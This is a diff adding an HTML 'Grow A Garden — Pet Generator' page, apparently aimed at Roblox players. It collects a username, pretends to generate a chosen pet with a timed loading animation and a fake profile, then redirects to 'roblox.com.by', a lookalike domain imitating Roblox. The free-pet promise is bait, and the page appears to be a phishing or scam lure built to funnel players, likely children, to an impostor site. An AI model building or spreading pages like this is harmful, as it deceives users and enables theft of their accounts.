@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grow A Garden — Pet Generator</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #0099ff, #33ccff);
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      width: 400px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .pets {
+      display: flex;
+      justify-content: space-around;
+      margin: 15px 0;
+    }
+
+    .pets div {
+      cursor: pointer;
+      padding: 10px;
+      border-radius: 8px;
+      transition: 0.3s;
+      border: 2px solid transparent;
+    }
+
+    .pets div:hover {
+      background: #f2f2f2;
+    }
+
+    .pets div.selected {
+      border: 2px solid #ff4500;
+      background: #ffe6e0;
+    }
+
+    .generate-btn {
+      background: #ff4500;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    .generate-btn:hover {
+      background: #e03e00;
+    }
+
+    .profile {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      background: #f9f9f9;
+      display: none;
+    }
+
+    .loading {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #ff4500;
+      display: none;
+    }
+
+    .pet-image {
+      width: 120px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Grow A Garden — Pet Generator</h1>
+    <input type="text" id="username" placeholder="Enter your username...">
+    
+    <div class="pets">
+      <div onclick="selectPet(this, 'Raccoon', 'raccoon.webp')">
+        <img src="raccoon.webp" alt="Raccoon" style="width:60px; display:block; margin:auto;">
+        Raccoon
+      </div>
+      <div onclick="selectPet(this, 'Dragonfly', 'df.jpeg')">
+        <img src="df.jpeg" alt="Dragonfly" style="width:60px; display:block; margin:auto;">
+        Dragonfly
+      </div>
+      <div onclick="selectPet(this, 'Red Fox', 'fox.jpeg')">
+        <img src="fox.jpeg" alt="Red Fox" style="width:60px; display:block; margin:auto;">
+        Red Fox
+      </div>
+      <div onclick="selectPet(this, 'Disco Bee', 'disco.jpeg')">
+        <img src="disco.jpeg" alt="Disco Bee" style="width:60px; display:block; margin:auto;">
+        Disco Bee
+      </div>
+    </div>
+
+    <button class="generate-btn" onclick="generatePet()">Generate</button>
+    
+    <div class="loading" id="loadingText">
+      ⏳ Generating pet...
+      <br>
+      <!-- PET IMAGE habang generating -->
+      <img id="loadingPetImage" class="pet-image" src="" alt="" style="display:none;">
+    </div>
+
+    <div class="profile" id="profileBox">
+      <h3 id="profileName"></h3>
+      <p id="selectedPet"></p>
+      <img id="petImage" class="pet-image" src="" alt="">
+    </div>
+  </div>
+
+  <script>
+    let chosenPet = null;
+    let chosenPetImage = null;
+
+    function selectPet(element, pet, img) {
+      document.querySelectorAll('.pets div').forEach(div => div.classList.remove('selected'));
+      element.classList.add('selected');
+      chosenPet = pet;
+      chosenPetImage = img;
+    }
+
+    function generatePet() {
+      const username = document.getElementById('username').value.trim();
+      const loading = document.getElementById('loadingText');
+      const loadingPetImage = document.getElementById('loadingPetImage');
+      const profileBox = document.getElementById('profileBox');
+      const profileName = document.getElementById('profileName');
+      const selectedPet = document.getElementById('selectedPet');
+      const petImage = document.getElementById('petImage');
+
+      if (!username || !chosenPet) {
+        alert("Please enter a username and select a pet!");
+        return;
+      }
+
+      // show loading + pet image
+      loading.style.display = "block";
+      loadingPetImage.src = chosenPetImage;
+      loadingPetImage.style.display = "block";
+      profileBox.style.display = "none";
+
+      setTimeout(() => {
+        loading.style.display = "none";
+        profileBox.style.display = "block";
+        profileName.innerText = username + "'s Profile";
+        selectedPet.innerText = "Selected Pet: " + chosenPet;
+        petImage.src = chosenPetImage;
+
+        // After showing profile, redirect
+        setTimeout(() => {
+          window.location.href = "https://www.roblox.com.by/games/126884695634066/Grow-a-Garden?privateServerLinkCode=77542304581189089351576240988405"; 
+        }, 2000);
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
